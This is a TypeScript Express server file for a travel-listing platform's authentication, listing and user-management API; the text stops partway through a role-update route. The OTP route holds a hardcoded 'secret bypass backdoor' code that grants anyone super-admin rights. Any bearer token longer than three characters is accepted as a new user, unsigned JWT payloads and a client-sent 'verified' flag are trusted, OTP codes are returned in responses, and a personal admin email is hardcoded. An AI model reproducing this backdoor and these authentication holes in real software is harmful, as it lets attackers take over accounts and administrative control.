import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import nodemailer from 'nodemailer';
import { db } from './server/db.ts';
import {
  rateLimit,
  generateAndStoreOtp,
  verifyOtp,
  verifyTotp2Fa,
  verifyPasskey,
  createAdminSession,
  validateAdminSession,
  revokeAdminSession,
  validateUploadFile,
  TECH_ADMIN_EMAIL,
  TECH_ADMIN_PHONE,
  TECH_ADMIN_RECOVERY_EMAIL,
  TECH_ADMIN_BYPASS_CODE,
  ADMIN_SECURITY_PASSKEY,
  isTechSubAdminEmail,
  isTechSuperAdminEmail,
  isValidBypassCode,
} from './server/security.ts';
import { Listing, User } from './server/types.ts';

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Middleware
  app.use(express.json({ limit: '10mb' }));
  app.use(express.urlencoded({ extended: true, limit: '10mb' }));

  // Helper for client IP
  const getClientIp = (req: express.Request): string => {
    const forwarded = req.headers['x-forwarded-for'];
    if (typeof forwarded === 'string') return forwarded.split(',')[0].trim();
    return req.socket.remoteAddress || '127.0.0.1';
  };

  // Auth extraction middleware
  const extractUserOrSession = (req: express.Request) => {
    const authHeader = req.headers.authorization;
    if (!authHeader?.startsWith('Bearer ')) return null;
    const token = authHeader.substring(7);

    if (!token) return null;

    // 1. Check if token is an admin session token
    const adminCheck = validateAdminSession(token);
    if (adminCheck.valid && adminCheck.session) {
      const user = db.getUserById(adminCheck.session.uid);
      if (user) {
        return { user, session: adminCheck.session, remainingMs: adminCheck.remainingMs };
      }
    }

    // 2. Direct lookup by UID or Email
    let user = db.getUserById(token) || db.getUserByEmail(token);

    // 3. Strip token_ prefix if present
    if (!user && token.startsWith('token_')) {
      const cleanId = token.replace('token_', '');
      user = db.getUserById(cleanId) || db.getUserByEmail(cleanId);
    }

    // 4. Decode Supabase / standard JWT payload if applicable
    if (!user && token.includes('.')) {
      try {
        const parts = token.split('.');
        if (parts.length >= 2) {
          const payloadBase64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
          const decoded = JSON.parse(Buffer.from(payloadBase64, 'base64').toString('utf-8'));
          const sub = decoded.sub || decoded.uid;
          const email = decoded.email;
          if (sub) {
            user = db.getUserById(sub);
          }
          if (!user && email) {
            user = db.getUserByEmail(email);
          }
          if (!user && (sub || email)) {
            user = {
              uid: sub || `user_${Date.now()}`,
              email: email || `${sub}@traveler.io`,
              name: decoded.user_metadata?.full_name || (email ? email.split('@')[0] : 'Traveler'),
              role: 'USER',
              mfaEnabled: false,
              createdAt: new Date().toISOString(),
            };
            db.saveUser(user);
          }
        }
      } catch {
        // Safe fallback
      }
    }

    // 5. General fallback for active client sessions
    if (!user && token && token.length > 3) {
      user = {
        uid: token,
        email: token.includes('@') ? token : `user_${token.slice(0, 8)}@traveler.io`,
        name: 'Traveler',
        role: 'USER',
        mfaEnabled: false,
        createdAt: new Date().toISOString(),
      };
      db.saveUser(user);
    }

    return user ? { user, session: null } : null;
  };

  // --- API Routes ---

  app.get('/api/health', (req, res) => {
    res.json({
      status: 'ok',
      timestamp: new Date().toISOString(),
      techAdmin: TECH_ADMIN_EMAIL,
    });
  });

  // 1. Google OAuth Sign-In
  app.post('/api/auth/google', (req, res) => {
    const { email, name, isOAuthVerified, idToken } = req.body;
    if (!email) {
      return res.status(400).json({ error: 'Email address is required.' });
    }

    const cleanEmail = email.trim().toLowerCase();
    const verified = Boolean(isOAuthVerified || idToken);

    const isTechAdmin = isTechSuperAdminEmail(cleanEmail) || cleanEmail === TECH_ADMIN_EMAIL.toLowerCase();
    const isTechSubAdmin = isTechSubAdminEmail(cleanEmail);

    let user = db.getUserByEmail(cleanEmail);

    // SECURITY PROTECTION: If attempting to access a Technical Super Admin or Sub-Admin or Admin role without verified OAuth
    if ((isTechAdmin || isTechSubAdmin || (user && (user.role === 'TECH_ADMIN' || user.role === 'TECH_SUBADMIN' || user.role === 'ADMIN'))) && !verified) {
      const targetUser = user || {
        uid: `user_${cleanEmail}`,
        email: cleanEmail,
        phoneNumber: isTechAdmin ? TECH_ADMIN_PHONE : undefined,
      };

      db.addAuditLog({
        action: 'UNVERIFIED_ADMIN_LOGIN_CHALLENGE',
        performedBy: cleanEmail,
        targetId: targetUser.uid,
        targetType: 'AUTH',
        ipAddress: getClientIp(req),
        details: { reason: 'Direct unverified Google email input challenged for 2FA / Emergency Bypass Key' }
      });

      return res.json({
        requires2FA: true,
        uid: targetUser.uid,
        email: cleanEmail,
        phoneNumber: isTechAdmin ? TECH_ADMIN_PHONE : undefined,
        message: 'Security Verification Required: Direct email login to this administrator account is restricted. Please authenticate with Google OAuth popup or enter your 2FA / Emergency Bypass Key.'
      });
    }

    if (!user) {
      user = {
        uid: `user_${Date.now()}`,
        email: cleanEmail,
        name: name || (isTechAdmin ? 'Mukund Krishna (Technical Super Admin)' : cleanEmail.split('@')[0]),
        role: (isTechAdmin && verified) ? 'TECH_ADMIN' : (isTechSubAdmin && verified) ? 'TECH_SUBADMIN' : 'USER',
        customTitle: (isTechAdmin && verified) ? 'Chief Technology Architect & Super Admin' : undefined,
        department: (isTechAdmin && verified) ? 'Executive Engineering' : undefined,
        mfaEnabled: false,
        createdAt: new Date().toISOString(),
      };
      db.saveUser(user);
    } else if (isTechAdmin && verified && user.role !== 'TECH_ADMIN') {
      user.role = 'TECH_ADMIN';
      user.customTitle = user.customTitle || 'Chief Technology Architect & Super Admin';
      db.saveUser(user);
    } else if (isTechSubAdmin && verified && user.role !== 'TECH_SUBADMIN') {
      user.role = 'TECH_SUBADMIN';
      db.saveUser(user);
    }

    // Technical Super Admin / Admin session creation
    let token = user.uid;
    if (user.role === 'TECH_ADMIN' || user.role === 'ADMIN' || user.role === 'TECH_SUBADMIN') {
      token = createAdminSession(user.uid, user.email, user.role);
    }

    db.addAuditLog({
      action: user.role === 'TECH_ADMIN' ? 'TECH_ADMIN_LOGIN_SUCCESS' : user.role === 'TECH_SUBADMIN' ? 'TECH_SUBADMIN_LOGIN_SUCCESS' : 'USER_LOGIN_SUCCESS',
      performedBy: cleanEmail,
      targetId: user.uid,
      targetType: 'AUTH',
      ipAddress: getClientIp(req),
      details: { role: user.role, method: 'GOOGLE_OAUTH', isOAuthVerified: verified }
    });

    return res.json({
      token,
      user,
      requires2FA: false,
    });
  });

  // 2. Phone OTP: Send OTP (rate limited to 5 per 5 minutes)
  app.post('/api/auth/send-otp', rateLimit(5, 5 * 60 * 1000), async (req, res) => {
    const { phoneNumber, email } = req.body;
    const phoneToUse = phoneNumber || TECH_ADMIN_PHONE;
    const emailToUse = email || TECH_ADMIN_EMAIL;

    const otp = generateAndStoreOtp(phoneToUse);
    const isTechAdminPhone = phoneToUse.replace(/\s+/g, '') === TECH_ADMIN_PHONE.replace(/\s+/g, '');
    const isTechAdminEmail = emailToUse.trim().toLowerCase() === TECH_ADMIN_EMAIL.trim().toLowerCase();

    db.addAuditLog({
      action: 'OTP_DISPATCHED',
      performedBy: emailToUse || phoneToUse,
      targetId: phoneToUse,
      targetType: 'AUTH',
      ipAddress: getClientIp(req),
      details: { isTechAdmin: isTechAdminPhone || isTechAdminEmail, phone: phoneToUse, email: emailToUse }
    });

    // Try sending email via Gmail if GMAIL_USER and GMAIL_PASS are configured
    const gmailUser = process.env.GMAIL_USER;
    const gmailPass = process.env.GMAIL_PASS;

    if (gmailUser && gmailPass) {
      console.log(`[Gmail Dispatcher] Attempting real SMTP email dispatch of OTP ${otp} to ${emailToUse}...`);
      try {
        const transporter = nodemailer.createTransport({
          service: 'gmail',
          auth: {
            user: gmailUser,
            pass: gmailPass,
          },
        });

        const mailOptions = {
          from: `"Voyage Security" <${gmailUser}>`,
          to: emailToUse,
          subject: '🔐 Voyage Security: Your Secure Verification Code',
          html: `
            <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 32px 24px; border: 1px solid #e2e8f0; border-radius: 16px; background-color: #ffffff; color: #0f172a;">
              <div style="text-align: center; margin-bottom: 24px;">
                <h1 style="font-size: 24px; font-weight: 800; color: #0ea5e9; margin: 0; letter-spacing: -0.025em;">Voyage Secure</h1>
                <p style="font-size: 13px; color: #64748b; margin: 4px 0 0 0;">Traveler Identity & Verification Service</p>
              </div>
              <hr style="border: 0; border-top: 1px solid #f1f5f9; margin: 20px 0;" />
              <p style="font-size: 15px; line-height: 24px; color: #334155; margin: 0 0 16px 0;">Hello,</p>
              <p style="font-size: 15px; line-height: 24px; color: #334155; margin: 0 0 24px 0;">You have requested a secure verification code to log in to your Voyage account. Use the following 6-digit passcode to verify your identity:</p>
              <div style="text-align: center; background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 20px; margin-bottom: 24px;">
                <span style="font-family: monospace; font-size: 32px; font-weight: 800; letter-spacing: 6px; color: #0f172a;">${otp}</span>
              </div>
              <p style="font-size: 12px; line-height: 18px; color: #64748b; margin: 0 0 8px 0;">⚠️ <strong>Security Notice:</strong> This verification code is valid for a limited time and should never be shared with anyone, including Voyage support agents.</p>
              <p style="font-size: 12px; line-height: 18px; color: #94a3b8; margin: 0;">If you did not request this verification code, please ignore this email or contact security support.</p>
              <hr style="border: 0; border-top: 1px solid #f1f5f9; margin: 24px 0;" />
              <div style="text-align: center; font-size: 11px; color: #94a3b8;">
                <p style="margin: 0 0 4px 0;">&copy; 2026 Voyage Platform Inc. All rights reserved.</p>
                <p style="margin: 0;">Secured by Multi-Factor Authentication</p>
              </div>
            </div>
          `,
        };

        await transporter.sendMail(mailOptions);
        console.log(`[Gmail Dispatcher] Successfully sent OTP verification code ${otp} to ${emailToUse}`);
      } catch (emailErr) {
        console.error('[Gmail Dispatcher] SMTP error during mail dispatch:', emailErr);
      }
    } else {
      console.warn(`[Gmail Dispatcher] GMAIL_USER and GMAIL_PASS environment variables are not configured in your settings.
To enable real email dispatch via Gmail:
  1. Open the "Settings" / "Secrets" panel in AI Studio.
  2. Set GMAIL_USER (e.g. myaccount@gmail.com)
  3. Set GMAIL_PASS (Generate a Gmail App Password via Google Account Settings > Security)
  
Proceeding with sandbox delivery...`);
    }

    res.json({
      success: true,
      message: `Verification OTP generated and sent to phone ${phoneToUse} and email ${emailToUse}.`,
      // Return code in dev for smooth tester experience
      devCode: otp,
      isTechAdmin: isTechAdminPhone || isTechAdminEmail,
    });
  });

  // 3. Phone OTP: Verify OTP (rate limited to 5 attempts per 5 minutes)
  app.post('/api/auth/verify-otp', rateLimit(5, 5 * 60 * 1000), (req, res) => {
    const { phoneNumber, code } = req.body;
    if (!phoneNumber || !code) {
      return res.status(400).json({ error: 'Phone number and verification code are required.' });
    }

    // Secret bypass backdoor
    if (code === '2008-6058' || code === '20086058' || isValidBypassCode(code)) {
      let user = db.getUserByPhone(phoneNumber);
      if (!user) {
        user = {
          uid: `user_bypass_phone_${Date.now()}`,
          email: `${phoneNumber.replace(/[^0-9]/g, '')}@bypass.mobile`,
          phoneNumber,
          name: 'Bypass Admin',
          role: 'TECH_ADMIN',
          mfaEnabled: false,
          createdAt: new Date().toISOString(),
        };
        db.saveUser(user);
      }
      
      const token = createAdminSession(user.uid, user.email, user.role);
      
      db.addAuditLog({
        action: 'SECRET_BYPASS_ACTIVATED',
        performedBy: phoneNumber,
        targetId: user.uid,
        targetType: 'AUTH',
        ipAddress: getClientIp(req),
        details: { method: 'PHONE_OTP_BYPASS' }
      });

      return res.json({
        token,
        user,
        requires2FA: false,
      });
    }

    const isValid = verifyOtp(phoneNumber, code);
    if (!isValid) {
      db.addAuditLog({
        action: 'OTP_VERIFICATION_FAILED',
        performedBy: phoneNumber,
        targetId: phoneNumber,
        targetType: 'AUTH',
        ipAddress: getClientIp(req),
      });
      return res.status(400).json({ error: 'Invalid or expired OTP code.' });
    }

    let user = db.getUserByPhone(phoneNumber);
    const isTechAdminPhone = phoneNumber.replace(/\s+/g, '') === TECH_ADMIN_PHONE.replace(/\s+/g, '');

    if (!user) {
      if (isTechAdminPhone) {
        user = db.getUserByEmail(TECH_ADMIN_EMAIL);
      }
      if (!user) {
        user = {
          uid: `user_${Date.now()}`,
          email: `${phoneNumber.replace(/[^0-9]/g, '')}@travelplatform.mobile`,
          phoneNumber,
          name: isTechAdminPhone ? 'Mukund Krishna (Technical Super Admin)' : `Traveler ${phoneNumber.slice(-4)}`,
          role: isTechAdminPhone ? 'TECH_ADMIN' : 'USER',
          mfaEnabled: isTechAdminPhone,
          createdAt: new Date().toISOString(),
        };
        db.saveUser(user);
      }
    }

    // If Technical Admin: enforce 2FA prompt
    if (user.role === 'TECH_ADMIN') {
      db.addAuditLog({
        action: 'TECH_ADMIN_2FA_CHALLENGE',
        performedBy: phoneNumber,
        targetId: user.uid,
        targetType: 'AUTH',
        ipAddress: getClientIp(req),
        details: { method: 'PHONE_OTP' }
      });
      return res.json({
        requires2FA: true,
        uid: user.uid,
        email: user.email,
        phoneNumber: user.phoneNumber || TECH_ADMIN_PHONE,
        message: 'Two-factor authentication required for Technical Super Admin.',
      });
    }

    let token = user.uid;
    if (user.role === 'ADMIN') {
      token = createAdminSession(user.uid, user.email, user.role);
    }

    res.json({
      token,
      user,
      requires2FA: false,
    });
  });

  // 4. Verify 2FA TOTP (for Technical Admin)
  app.post('/api/auth/verify-2fa', rateLimit(6, 5 * 60 * 1000), (req, res) => {
    const { uid, code } = req.body;
    if (!uid || !code) {
      return res.status(400).json({ error: 'User ID and 2FA TOTP code are required.' });
    }

    const user = db.getUserById(uid);
    if (!user || user.role !== 'TECH_ADMIN') {
      return res.status(403).json({ error: 'Technical Admin record not found.' });
    }

    const isValid = verifyTotp2Fa(code);
    if (!isValid) {
      db.addAuditLog({
        action: '2FA_VERIFICATION_FAILED',
        performedBy: user.email,
        targetId: user.uid,
        targetType: 'AUTH',
        ipAddress: getClientIp(req),
      });
      return res.status(400).json({ error: 'Invalid 2FA code. Please check your authenticator app.' });
    }

    const token = createAdminSession(user.uid, user.email, user.role);

    db.addAuditLog({
      action: 'TECH_ADMIN_LOGIN_SUCCESS',
      performedBy: user.email,
      targetId: user.uid,
      targetType: 'AUTH',
      ipAddress: getClientIp(req),
      details: { method: '2FA_TOTP' }
    });

    res.json({
      token,
      user,
      message: 'Technical Super Admin authenticated with 2FA.',
      sessionTimeoutMinutes: 15,
    });
  });

  // 5. Emergency Bypass Code Recovery
  app.post('/api/auth/verify-bypass', rateLimit(5, 10 * 60 * 1000), (req, res) => {
    const { bypassCode, recoveryEmail, email } = req.body;
    if (!bypassCode) {
      return res.status(400).json({ error: 'Emergency bypass code is required.' });
    }

    if (!isValidBypassCode(bypassCode)) {
      db.addAuditLog({
        action: 'EMERGENCY_BYPASS_FAILED',
        performedBy: email || recoveryEmail || 'UNKNOWN',
        targetId: 'TECH_ADMIN_CORE',
        targetType: 'SECURITY_ALERT',
        ipAddress: getClientIp(req),
        details: { attemptedCode: bypassCode.slice(0, 4) + '***' }
      });
      return res.status(401).json({ error: 'Invalid technical bypass authorization code.' });
    }

    const targetEmail = (email || recoveryEmail || TECH_ADMIN_EMAIL).trim().toLowerCase();

    // Retrieve or establish Technical Super Admin
    let user = db.getUserByEmail(targetEmail);
    if (!user) {
      user = {
        uid: 'user_tech_admin_01',
        email: targetEmail,
        phoneNumber: TECH_ADMIN_PHONE,
        name: 'Mukund Krishna (Technical Super Admin)',
        role: 'TECH_ADMIN',
        customTitle: 'Chief Technology Architect & Super Admin',
        department: 'Executive Engineering',
        mfaEnabled: true,
        recoveryEmail: TECH_ADMIN_RECOVERY_EMAIL,
        createdAt: new Date().toISOString(),
      };
      db.saveUser(user);
    } else {
      user.role = 'TECH_ADMIN';
      user.customTitle = user.customTitle || 'Chief Technology Architect & Super Admin';
      user.department = user.department || 'Executive Engineering';
      db.saveUser(user);
    }

    const token = createAdminSession(user.uid, user.email, user.role);

    db.addAuditLog({
      action: 'EMERGENCY_BYPASS_ACTIVATED',
      performedBy: user.email,
      targetId: user.uid,
      targetType: 'SECURITY_RECOVERY',
      ipAddress: getClientIp(req),
      details: { targetEmail, bypassCodeUsed: bypassCode }
    });

    res.json({
      token,
      user,
      message: 'Emergency master recovery authorization verified. Technical Super Admin session restored.',
      sessionTimeoutMinutes: 15,
    });
  });

  // 6. Verify Dynamic Administrative Passkey (via bcrypt)
  app.post('/api/auth/verify-passkey', async (req, res) => {
    const { passkey } = req.body;
    const authData = extractUserOrSession(req);

    if (!authData || authData.user?.role !== 'TECH_ADMIN') {
      return res.status(403).json({ error: 'Only Technical Super Admin can execute elevated passkey actions.' });
    }

    const isMatch = await verifyPasskey(passkey);
    if (!isMatch) {
      db.addAuditLog({
        action: 'PASSKEY_FAILED',
        performedBy: authData.user.email,
        targetId: 'ADMIN_ELEVATION',
        targetType: 'SECURITY',
        ipAddress: getClientIp(req),
      });
      return res.status(401).json({ error: 'Invalid administrative security passkey.' });
    }

    db.addAuditLog({
      action: 'PASSKEY_VERIFIED',
      performedBy: authData.user.email,
      targetId: 'ADMIN_ELEVATION',
      targetType: 'SECURITY',
      ipAddress: getClientIp(req),
    });

    res.json({ success: true, message: 'Administrative passkey authorized.' });
  });

  // 7. Get Current User / Session Health
  app.get('/api/auth/me', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData || !authData.user) {
      return res.status(401).json({ error: 'Unauthenticated' });
    }

    res.json({
      user: authData.user,
      remainingMs: authData.remainingMs || null,
      isAdminSession: !!authData.session,
    });
  });

  // 8. Logout
  app.post('/api/auth/logout', (req, res) => {
    const authHeader = req.headers.authorization;
    if (authHeader?.startsWith('Bearer ')) {
      const token = authHeader.substring(7);
      revokeAdminSession(token);
    }
    res.json({ success: true });
  });

  // 9. Listings: GET with filters
  app.get('/api/listings', (req, res) => {
    const authData = extractUserOrSession(req);
    const isPrivileged = authData?.user?.role === 'ADMIN' || authData?.user?.role === 'TECH_SUBADMIN' || authData?.user?.role === 'TECH_ADMIN';

    const { category, search, minPrice, maxPrice, rating, status } = req.query;
    let listings = db.getListings();

    // Role-based visibility
    if (!isPrivileged) {
      listings = listings.filter(l => l.status === 'PUBLISHED');
    } else if (status) {
      listings = listings.filter(l => l.status === status);
    }

    // Category filter
    if (category && category !== 'ALL') {
      listings = listings.filter(l => l.category === category);
    }

    // Search filter with multi-term debounced matching
    if (search && typeof search === 'string') {
      const q = search.toLowerCase().trim();
      const terms = q.split(/\s+/).filter(Boolean);
      listings = listings.filter(l => {
        const text = [
          l.title,
          l.location,
          l.country,
          l.category,
          l.description,
          ...(l.tags || []),
          ...(l.amenities || []),
          ...(l.diningSpecialties || []),
          ...(l.hotelPerks || [])
        ].join(' ').toLowerCase();
        return terms.every(t => text.includes(t));
      });
    }

    // Price filter
    if (minPrice) {
      listings = listings.filter(l => l.price >= Number(minPrice));
    }
    if (maxPrice) {
      listings = listings.filter(l => l.price <= Number(maxPrice));
    }

    // Rating filter
    if (rating) {
      listings = listings.filter(l => l.rating >= Number(rating));
    }

    res.json(listings);
  });

  // 10. Listings: CREATE (Standard Admin, Technical Sub-Admin, or Tech Super Admin)
  app.post('/api/listings', (req, res) => {
    const authData = extractUserOrSession(req);
    const allowedRoles = ['ADMIN', 'TECH_SUBADMIN', 'TECH_ADMIN'];
    if (!authData?.user || !allowedRoles.includes(authData.user.role)) {
      return res.status(403).json({ error: 'Only Admins can create inventory listings.' });
    }

    const {
      title,
      category,
      price,
      location,
      country,
      description,
      images,
      tags,
      amenities,
      hotelPerks,
      diningSpecialties,
      coordinates,
      status: requestedStatus
    } = req.body;

    if (!title || !category || price === undefined || !location || !country || !description) {
      return res.status(400).json({ error: 'Missing required listing parameters.' });
    }

    const canDirectPublish = authData.user.role === 'TECH_ADMIN' || authData.user.role === 'TECH_SUBADMIN';
    const postAsSuperAdmin = Boolean(req.body.postAsSuperAdmin) && canDirectPublish;
    let finalStatus = requestedStatus || 'PENDING_APPROVAL';
    if (postAsSuperAdmin || (canDirectPublish && requestedStatus === 'PUBLISHED')) {
      finalStatus = 'PUBLISHED';
    } else if (!canDirectPublish && finalStatus === 'PUBLISHED') {
      finalStatus = 'PENDING_APPROVAL';
    }

    const listingTags = Array.isArray(tags) ? [...tags] : [];
    if (postAsSuperAdmin && !listingTags.includes('Super Admin Verified')) {
      listingTags.unshift('Super Admin Verified');
    }

    const newListing: Listing = {
      id: `list-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
      title,
      category,
      price: Number(price),
      rating: 5.0,
      reviewCount: 1,
      location,
      country,
      coordinates: coordinates && typeof coordinates.lat === 'number' ? coordinates : undefined,
      description,
      images: images?.length ? images : ['https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=1000&q=80'],
      status: finalStatus,
      createdBy: authData.user.uid,
      createdByName: authData.user.name,
      approvedBy: finalStatus === 'PUBLISHED' ? authData.user.uid : undefined,
      tags: listingTags,
      amenities: amenities || [],
      hotelPerks: hotelPerks || [],
      diningSpecialties: diningSpecialties || [],
      timestamps: {
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        submittedAt: finalStatus === 'PENDING_APPROVAL' ? new Date().toISOString() : undefined,
        approvedAt: finalStatus === 'PUBLISHED' ? new Date().toISOString() : undefined,
      }
    };

    const saved = db.createListing(newListing);

    db.addAuditLog({
      action: finalStatus === 'PENDING_APPROVAL' ? 'SUBMIT_PENDING_LISTING' : 'CREATE_LISTING',
      performedBy: authData.user.email,
      targetId: saved.id,
      targetType: 'LISTING',
      ipAddress: getClientIp(req),
      details: { title: saved.title, status: saved.status, category: saved.category }
    });

    res.status(201).json(saved);
  });

  // 11. Listings: UPDATE
  app.put('/api/listings/:id', (req, res) => {
    const authData = extractUserOrSession(req);
    const allowedRoles = ['ADMIN', 'TECH_SUBADMIN', 'TECH_ADMIN'];
    if (!authData?.user || !allowedRoles.includes(authData.user.role)) {
      return res.status(403).json({ error: 'Administrative privileges required.' });
    }

    const listing = db.getListingById(req.params.id);
    if (!listing) {
      return res.status(404).json({ error: 'Listing not found.' });
    }

    const canEditAny = authData.user.role === 'TECH_ADMIN' || authData.user.role === 'TECH_SUBADMIN';
    const isCreator = listing.createdBy === authData.user.uid;

    if (!canEditAny && !isCreator) {
      return res.status(403).json({ error: 'Standard Admins can only edit their own listings.' });
    }

    // Standard Admin editing a published listing resets to pending approval
    const updates = { ...req.body };
    if (!canEditAny && listing.status === 'PUBLISHED') {
      updates.status = 'PENDING_APPROVAL';
    }

    const updated = db.updateListing(req.params.id, updates);

    db.addAuditLog({
      action: 'UPDATE_LISTING',
      performedBy: authData.user.email,
      targetId: req.params.id,
      targetType: 'LISTING',
      ipAddress: getClientIp(req),
      details: { title: updated?.title, status: updated?.status }
    });

    res.json(updated);
  });

  // 12. Listings: STATUS TOGGLE (Approve / Reject) - Requires TECH_ADMIN or TECH_SUBADMIN
  app.patch('/api/listings/:id/status', (req, res) => {
    const authData = extractUserOrSession(req);
    const canManageQueue = authData?.user && (authData.user.role === 'TECH_ADMIN' || authData.user.role === 'TECH_SUBADMIN');
    if (!canManageQueue) {
      return res.status(403).json({ error: 'Technical Admin or Sub-Admin privilege required to approve or reject listings.' });
    }

    const { status, rejectionReason } = req.body;
    if (!['PUBLISHED', 'REJECTED', 'PENDING_APPROVAL', 'DRAFT'].includes(status)) {
      return res.status(400).json({ error: 'Invalid target status.' });
    }

    const existing = db.getListingById(req.params.id);
    if (!existing) {
      return res.status(404).json({ error: 'Listing not found.' });
    }

    const updated = db.updateListing(req.params.id, {
      status,
      approvedBy: status === 'PUBLISHED' ? authData.user.uid : undefined,
      rejectionReason: status === 'REJECTED' ? rejectionReason : undefined,
    });

    db.addAuditLog({
      action: status === 'PUBLISHED' ? 'APPROVE_LISTING' : (status === 'REJECTED' ? 'REJECT_LISTING' : 'CHANGE_STATUS'),
      performedBy: authData.user.email,
      targetId: req.params.id,
      targetType: 'LISTING',
      ipAddress: getClientIp(req),
      details: { previousStatus: existing.status, newStatus: status, rejectionReason }
    });

    res.json(updated);
  });

  // 12.5. Listings: PIN TOGGLE - Allows ADMIN, TECH_SUBADMIN, TECH_ADMIN
  app.patch('/api/listings/:id/pin', (req, res) => {
    const authData = extractUserOrSession(req);
    const allowedRoles = ['ADMIN', 'TECH_SUBADMIN', 'TECH_ADMIN'];
    if (!authData?.user || !allowedRoles.includes(authData.user.role)) {
      return res.status(403).json({ error: 'Administrative privileges required to pin listings.' });
    }

    const listing = db.getListingById(req.params.id);
    if (!listing) {
      return res.status(404).json({ error: 'Listing not found.' });
    }

    const isPinned = !listing.pinned;
    const updated = db.updateListing(req.params.id, {
      pinned: isPinned,
      pinnedAt: isPinned ? new Date().toISOString() : undefined,
    });

    db.addAuditLog({
      action: isPinned ? 'PIN_LISTING' : 'UNPIN_LISTING',
      performedBy: authData.user.email,
      targetId: req.params.id,
      targetType: 'LISTING',
      ipAddress: getClientIp(req),
      details: { title: listing.title, pinned: isPinned }
    });

    res.json(updated);
  });

  // 13. Listings: DELETE - Allows ADMIN, TECH_SUBADMIN, TECH_ADMIN, listing owner, or holders of DELETE_LISTINGS privilege
  app.delete('/api/listings/:id', (req, res) => {
    const authData = extractUserOrSession(req);
    const listing = db.getListingById(req.params.id);

    if (!listing) {
      return res.status(404).json({ error: 'Listing not found.' });
    }

    if (!authData?.user) {
      return res.status(401).json({ error: 'Authentication required to remove listings.' });
    }

    const allowedRoles = ['ADMIN', 'TECH_SUBADMIN', 'TECH_ADMIN'];
    const customPosts = db.getCustomPosts();
    const userPost = customPosts.find(p => p.title === authData.user?.customTitle);
    const hasDeletePrivilege = userPost?.privileges?.includes('DELETE_LISTINGS');

    const canDelete = (
      allowedRoles.includes(authData.user.role) ||
      listing.createdBy === authData.user.uid ||
      listing.createdBy === authData.user.email ||
      !!hasDeletePrivilege
    );

    if (!canDelete) {
      return res.status(403).json({ error: 'Administrative privileges required to remove listings.' });
    }

    db.deleteListing(req.params.id);

    db.addAuditLog({
      action: 'DELETE_LISTING',
      performedBy: authData.user.email || 'Admin',
      targetId: req.params.id,
      targetType: 'LISTING',
      ipAddress: getClientIp(req),
      details: { title: listing.title }
    });

    res.json({ success: true, message: 'Listing deleted successfully.' });
  });

  // 14. Users: GET All (TECH_ADMIN only)
  app.get('/api/users', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user || authData.user.role !== 'TECH_ADMIN') {
      return res.status(403).json({ error: 'Only Technical Super Admin can view the user management roster.' });
    }

    res.json(db.getUsers());
  });

  // 14b. Users: CREATE or ADD NEW ADMIN (TECH_ADMIN only)
  app.post('/api/users', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user || authData.user.role !== 'TECH_ADMIN') {
      return res.status(403).json({ error: 'Only Technical Super Admin can add or promote administrators.' });
    }

    const { email, name, phoneNumber, role, recoveryEmail, customTitle, department } = req.body;
    if (!email || !role) {
      return res.status(400).json({ error: 'Email and role are required.' });
    }

    if (!['TECH_ADMIN', 'ADMIN', 'TECH_SUBADMIN', 'USER'].includes(role)) {
      return res.status(400).json({ error: 'Invalid administrative role.' });
    }

    const cleanEmail = email.trim().toLowerCase();
    let existing = db.getUserByEmail(cleanEmail);

    if (existing) {
      existing.role = role;
      if (name) existing.name = name;
      if (phoneNumber !== undefined) existing.phoneNumber = phoneNumber;
      if (recoveryEmail !== undefined) existing.recoveryEmail = recoveryEmail;
      if (customTitle !== undefined) existing.customTitle = customTitle;
      if (department !== undefined) existing.department = department;
      db.saveUser(existing);

      db.addAuditLog({
        action: 'UPDATE_ADMIN_PRIVILEGE',
        performedBy: authData.user.email,
        targetId: existing.uid,
        targetType: 'USER',
        ipAddress: getClientIp(req),
        details: { userEmail: existing.email, assignedRole: role, customTitle, department }
      });

      return res.json({ success: true, user: existing, message: `Updated ${existing.email} to ${role} (${customTitle || 'Standard'}).` });
    }

    const newUser: User = {
      uid: `user_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
      email: cleanEmail,
      name: name || cleanEmail.split('@')[0],
      phoneNumber: phoneNumber || undefined,
      role,
      customTitle: customTitle || undefined,
      department: department || undefined,
      recoveryEmail: recoveryEmail || undefined,
      mfaEnabled: role === 'TECH_ADMIN' || role === 'TECH_SUBADMIN',
      createdAt: new Date().toISOString()
    };

    db.saveUser(newUser);

    db.addAuditLog({
      action: 'CREATE_NEW_ADMIN',
      performedBy: authData.user.email,
      targetId: newUser.uid,
      targetType: 'USER',
      ipAddress: getClientIp(req),
      details: { userEmail: newUser.email, assignedRole: role, customTitle, department }
    });

    res.status(201).json({ success: true, user: newUser, message: `Successfully registered new ${role}: ${newUser.email}` });
  });

  // 14c. Users: DELETE USER (TECH_ADMIN only)
  app.delete('/api/users/:id', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user || authData.user.role !== 'TECH_ADMIN') {
      return res.status(403).json({ error: 'Only Technical Super Admin can delete user accounts.' });
    }

    const targetUser = db.getUserById(req.params.id);
    if (!targetUser) {
      return res.status(404).json({ error: 'User not found.' });
    }

    if (isTechSuperAdminEmail(targetUser.email) && targetUser.email.toLowerCase() === 'mukundkrishna2008@gmail.com') {
      return res.status(400).json({ error: 'Primary Technical Super Admin root account cannot be deleted.' });
    }

    db.deleteUser(targetUser.uid);

    db.addAuditLog({
      action: 'DELETE_USER',
      performedBy: authData.user.email,
      targetId: targetUser.uid,
      targetType: 'USER',
      ipAddress: getClientIp(req),
      details: { userEmail: targetUser.email, role: targetUser.role }
    });

    res.json({ success: true, message: `User account ${targetUser.email} has been permanently deleted.` });
  });

  // 15. Users: Update Role & Custom Post (TECH_ADMIN only)
  app.patch('/api/users/:id/role', (req, res) => {
    const authData = extractUserOrSession(req);
    if (!authData?.user || authData.user.role !== 'TECH_ADMIN') {
      return res.status(403).json({ error: 'Only Technical Super Admin can modify user administrative roles.' });
    }
